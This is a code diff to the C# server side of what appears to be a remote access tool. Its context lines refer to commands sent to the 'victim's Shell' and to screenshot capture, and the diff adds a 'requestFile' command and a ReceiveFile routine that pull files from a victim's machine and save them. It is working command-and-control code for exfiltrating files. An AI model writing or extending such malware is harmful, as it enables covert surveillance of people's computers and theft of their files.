@@ -129,6 +129,23 @@ class Server
                         Console.WriteLine("\n[Server] Sending STOP command...");
                         SendCommand(stream, "stop");
                     }
+                    else if (command.StartsWith("requestFile ", StringComparison.OrdinalIgnoreCase))
+                    {
+                        string[] parts = command.Split(new char[] { ' ' }, 2);
+
+                        if (parts.Length == 2)
+                        {
+                            string fileName = parts[1].Trim();
+
+                            Console.WriteLine("Requested file: " + fileName);
+
+                            ReceiveFile(stream, fileName);
+                        }
+                        else
+                        {
+                            Console.WriteLine("Missing file name.");
+                        }
+                    }
                     else 
                     {
                         Console.WriteLine("[Server] Unknown command. Sending to victim's Shell.");
@@ -185,6 +202,39 @@ class Server
             return null;
         }
     }
+    public static void ReceiveFile(NetworkStream stream, string saveFolder)
+    {
+        byte[] nameLenBuf = ReadExactly(stream, 4);
+        int nameLen = BitConverter.ToInt32(nameLenBuf, 0);
+
+        byte[] nameBuf = ReadExactly(stream, nameLen);
+        string fileName = Encoding.UTF8.GetString(nameBuf);
+
+        byte[] sizeBuf = ReadExactly(stream, 8);
+        long fileSize = BitConverter.ToInt64(sizeBuf, 0);
+
+        string savePath = saveFolder;
+
+        using (FileStream fs = File.Create(savePath))
+        {
+            byte[] buffer = new byte[8192];
+            long remaining = fileSize;
+
+            while (remaining > 0)
+            {
+                int toRead = (int)Math.Min(buffer.Length, remaining);
+                int read = stream.Read(buffer, 0, toRead);
+
+                if (read <= 0)
+                    throw new IOException("Connection closed.");
+
+                fs.Write(buffer, 0, read);
+                remaining -= read;
+            }
+        }
+
+        Console.WriteLine("Received: " + savePath);
+    }
 
     private static void ReceiveSingleScreenshot(NetworkStream stream, string targetFolder)
     {
@@ -226,6 +276,7 @@ class Server
         }
         return buffer;
     }
+
 }
 
 public class GameData
